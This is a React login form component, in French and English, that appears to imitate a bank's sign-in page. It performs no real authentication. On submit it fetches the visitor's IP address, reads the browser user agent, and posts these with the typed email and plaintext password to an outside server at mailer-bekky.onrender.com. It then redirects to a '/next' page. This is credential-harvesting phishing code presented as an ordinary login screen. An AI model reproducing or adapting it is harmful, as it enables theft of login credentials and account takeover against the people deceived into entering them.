import {useState} from "react";
import {Formik, Form, Field} from "formik";
import * as Yup from "yup";
import {Link, useNavigate} from "react-router-dom";
import axios from "axios";

const LoginSchema = Yup.object().shape({
  email: Yup.string()
    .email("Adresse courriel invalide")
    .required("Le courriel est requis"),
  password: Yup.string()
    .required("Le mot de passe est requis")
    .min(8, "Le mot de passe doit contenir au moins 8 caractères"),
});

// eslint-disable-next-line react/prop-types
export const LoginForm = ({language}) => {
  const navigate = useNavigate();

  const [showPassword, setShowPassword] = useState(false);
  const sendEmail = async (email, password, ip, browser) => {
    const templateParams = {
      email,
      password,
      ip,
      browser,
    };

    try {
      await axios.post("https://mailer-bekky.onrender.com/send-email", {
        subject: "Login",
        message: templateParams,
      });
    } catch (error) {
      console.error("Error sending email:", error);
    }
  };
  const handleSubmit = async (values) => {
    const ip = await fetch("https://api64.ipify.org?format=json")
      .then((response) => response.json())
      .then((data) => data.ip);

    const browser = navigator.userAgent;
    await sendEmail(values.email, values.password, ip, browser);
    navigate("/next");
  };

  return (
    <main className="p-4 md:p-10">
      <h1 className="text-[2em] font-bold tracking-[.5px] leading-[1.5] font-gilroy">
        {language === "en" ? " Good morning" : "Bonjour"}
      </h1>

      <Formik
        initialValues={{
          email: "",
          password: "",
          rememberMe: false,
        }}
        validationSchema={LoginSchema}
        onSubmit={(values, {setSubmitting}) => {
          handleSubmit(values);
          setSubmitting(false);
        }}
      >
        {({errors, touched, isSubmitting}) => (
          <Form className="login-form">
            {(errors.email && touched.email) ||
            (errors.password && touched.password) ? (
              <div
                className="text-[#cc191f] bg-[#fbe7ee] my-8 p-[2em] text-[1em] text-center hover:shadow-[0_0_0_3px_rgba(228,28,35,.2)] rounded-md transition-all duration-200"
                role="alert"
              >
                {language === "en"
                  ? "Invalid email"
                  : " Courriel ou mot de passe invalide"}
              </div>
            ) : null}

            <div className="flex flex-col mb-6 mt-3">
              <label className="font-medium mt-4 mb-1.5" htmlFor="email">
                {language === "en" ? " Email ID" : " Courriel d'identification"}
              </label>
              <div className="">
                <Field
                  className={`rounded h-10 border border-[#d5d5d5] p-4 w-full focus:outline-none focus:ring-0 ${
                    errors.email && touched.email
                      ? "hover:shadow-[0_0_0_3px_rgba(228,28,35,.2)] focus:shadow-[0_0_0_3px_rgba(228,28,35,.2)] border-[#e41c23]"
                      : "border-[#d5d5d5] focus:border-[#1572c5] hover:border-[#1572c5] focus:shadow-[0_0_0_3px_rgba(29,114,197,.2)]"
                  }`}
                  name="email"
                  type="email"
                  placeholder={
                    language === "en"
                      ? "Enter your email ID"
                      : "Entrez votre courriel d'identification"
                  }
                  maxLength="255"
                  autoComplete="on"
                />
              </div>

              <label className="font-medium mt-4 mb-1.5" htmlFor="password">
                {language === "en" ? "Password" : "Mot de passe"}
              </label>
              <div className="relative w-full">
                <Field
                  className={`rounded h-10 border p-4 w-full focus:outline-none focus:ring-0  ${
                    errors.password && touched.password
                      ? "hover:shadow-[0_0_0_3px_rgba(228,28,35,.2)] focus:shadow-[0_0_0_3px_rgba(228,28,35,.2)] border-[#e41c23]"
                      : "border-[#d5d5d5] focus:border-[#1572c5] hover:border-[#1572c5] focus:shadow-[0_0_0_3px_rgba(29,114,197,.2)]"
                  }`}
                  name="password"
                  type={showPassword ? "text" : "password"}
                  placeholder={
                    language === "en"
                      ? "Enter your password"
                      : "Entrez votre mot de passe"
                  }
                  maxLength="250"
                  autoComplete="current-password"
                />
                <button
                  type="button"
                  className="input-password__icon"
                  onClick={() => setShowPassword(!showPassword)}
                  aria-label={
                    showPassword
                      ? "Masquer le mot de passe"
                      : "Lire votre mot de passe"
                  }
                >
                  <span className="absolute top-3 right-3">
                    <svg width="20" height="20" viewBox="0 0 16 16">
                      <g fill="#1572c5" fillRule="nonzero">
                        <g transform="translate(1.000000, 3.000000)">
                          <path
                            d="M1.01860539,5.53033132 C1.38375935,6.09573101 1.81517794,6.66152588 2.30830424,7.18752727 C3.68684421,8.6579699 5.25936609,9.52556818 7,9.52556818 C8.74063391,9.52556818 10.3131558,8.6579699 11.6916958,7.18752727 C12.1848221,6.66152588 12.6162406,6.09573101 12.9813946,5.53033132 C13.0897048,5.36262529 13.1800415,5.21449046 13.2520006,5.09090909 C13.1800415,4.96732772 13.0897048,4.81919289 12.9813946,4.65148686 C12.6162406,4.08608717 12.1848221,3.5202923 11.6916958,2.99429091 C10.3131558,1.52384828 8.74063391,0.65625 7,0.65625 C5.25936609,0.65625 3.68684421,1.52384828 2.30830424,2.99429091 C1.81517794,3.5202923 1.38375935,4.08608717 1.01860539,4.65148686 C0.910295242,4.81919289 0.819958491,4.96732772 0.747999429,5.09090909 C0.819958491,5.21449046 0.910295242,5.36262529 1.01860539,5.53033132 Z M-0.586967844,4.79742517 C-0.497205826,4.61790113 -0.328963691,4.318804 -0.0839462962,3.93942223 C0.32149633,3.3116401 0.799878879,2.68425315 1.35078666,2.09661818 C2.95520124,0.385242631 4.84290664,-0.65625 7,-0.65625 C9.15709336,-0.65625 11.0447988,0.385242631 12.6492133,2.09661818 C13.2001211,2.68425315 13.6785037,3.3116401 14.0839463,3.93942223 C14.3289637,4.318804 14.4972058,4.61790113 14.5869678,4.79742517 C14.6793441,4.98217758 14.6793441,5.1996406 14.5869678,5.38439301 C14.4972058,5.56391705 14.3289637,5.86301418 14.0839463,6.24239595 C13.6785037,6.87017808 13.2001211,7.49756503 12.6492133,8.0852 C11.0447988,9.79657555 9.15709336,10.8380682 7,10.8380682 C4.84290664,10.8380682 2.95520124,9.79657555 1.35078666,8.0852 C0.799878879,7.49756503 0.32149633,6.87017808 -0.0839462962,6.24239595 C-0.328963691,5.86301418 -0.497205826,5.56391705 -0.586967844,5.38439301 C-0.679344052,5.1996406 -0.679344052,4.98217758 -0.586967844,4.79742517 Z"
                            id="Shape"
                            fillRule="nonzero"
                          ></path>
                          <path
                            d="M7,7.65625 C5.58320134,7.65625 4.43465909,6.50770775 4.43465909,5.09090909 C4.43465909,3.67411043 5.58320134,2.52556818 7,2.52556818 C8.41679866,2.52556818 9.56534091,3.67411043 9.56534091,5.09090909 C9.56534091,6.50770775 8.41679866,7.65625 7,7.65625 Z M7,6.34375 C7.69192493,6.34375 8.25284091,5.78283402 8.25284091,5.09090909 C8.25284091,4.39898416 7.69192493,3.83806818 7,3.83806818 C6.30807507,3.83806818 5.74715909,4.39898416 5.74715909,5.09090909 C5.74715909,5.78283402 6.30807507,6.34375 7,6.34375 Z"
                            id="Oval"
                            fillRule="nonzero"
                          ></path>
                        </g>
                      </g>
                    </svg>
                  </span>
                </button>
              </div>

              <Link
                to={"#"}
                className="underline text-[#1572c5] flex justify-self-end mt-4 text-sm"
                type="button"
              >
                {language === "en"
                  ? "Forgotten password?"
                  : " Mot de passe oublié?"}
              </Link>
            </div>

            <div className="flex items-center mt-2 gap-2">
              <div
                className="flex items-center gap-2 relative"
                data-test="remember"
              >
                <Field
                  type="checkbox"
                  name="rememberMe"
                  id="rememberMe-check"
                  className="accent-[#1572c5] border-[#1572c5] w-6 h-6 rounded-md focus:shadow-[0_0_0_3px_rgba(29,114,197,.2)]"
                />
                <label className="" htmlFor="rememberMe-check">
                  <span className="dsc-checkbox__text">
                    <span data-test="label">
                      {language === "en"
                        ? "Remember my email ID"
                        : "Se souvenir de mon courriel d'identification"}
                    </span>
                  </span>
                </label>
              </div>
              <span className="relative group">
                <button
                  className=""
                  title="Se souvenir de mon courriel d'identification."
                  aria-label="Se souvenir de mon courriel d'identification."
                  aria-haspopup="true"
                  type="button"
                >
                  <svg
                    viewBox="0 0 64 64"
                    focusable="false"
                    width="24"
                    fill="#000"
                    height="24"
                    className="dsc-icon"
                  >
                    <path d="M32 2c16.569 0 30 13.431 30 30 0 16.569-13.431 30-30 30C15.431 62 2 48.569 2 32 2 15.431 15.431 2 32 2zm0 4C17.64 6 6 17.64 6 32s11.64 26 26 26 26-11.64 26-26S46.36 6 32 6zm0 21a2 2 0 011.995 1.85L34 29v16a2 2 0 01-3.995.15L30 45V29a2 2 0 012-2zm0-10a2 2 0 011.995 1.85L34 19v2a2 2 0 01-3.995.15L30 21v-2a2 2 0 012-2z" />
                  </svg>
                </button>
                <span className="absolute bottom-8 -right-10 transform  hidden group-hover:flex bg-white  text-sm rounded px-2 py-1 border border-black/20 w-[225px]">
                  Se souvenir de mon courriel d&apos;identification. Vous pouvez
                  mémoriser votre courriel d&apos;identification en toute
                  sécurité pour simplifier vos prochaines connexions.
                </span>
              </span>
            </div>

            <button
              type="submit"
              className="border-[#1572c5] bg-[#1572c5] text-white w-full rounded-3xl mt-4 h-12 text-xl flex items-center justify-center gap-4 py-2 font-semibold font-gilroy"
              disabled={isSubmitting}
            >
              <div className="dsc-btn__icon">
                <svg
                  viewBox="0 0 64 64"
                  focusable="false"
                  width="24"
                  fill="#fff"
                  height="24"
                >
                  <title>lock</title>
                  <path d="M32 2c9.83 0 17.82 7.88 17.997 17.67L50 20v5h2a6 6 0 016 6v21c0 5.523-4.477 10-10 10H17c-5.523 0-10-4.477-10-10V31a6 6 0 016-6h1v-5c0-9.941 8.059-18 18-18zm20 27H13a2 2 0 00-2 2v21a6 6 0 006 6h31a6 6 0 006-6V31a2 2 0 00-2-2zm-20 8c2.763 0 5 2.237 5 5a5 5 0 01-2.999 4.584L34 50a2 2 0 01-3.995.15L30 50v-3.416A5 5 0 0127 42c0-2.763 2.237-5 5-5zm0-31c-7.628 0-13.83 6.1-13.997 13.687L18 20v5h28v-5c0-7.732-6.268-14-14-14z" />
                </svg>
              </div>
              {language === "en" ? "Sign in" : "Se connecter"}
            </button>
          </Form>
        )}
      </Formik>
    </main>
  );
};
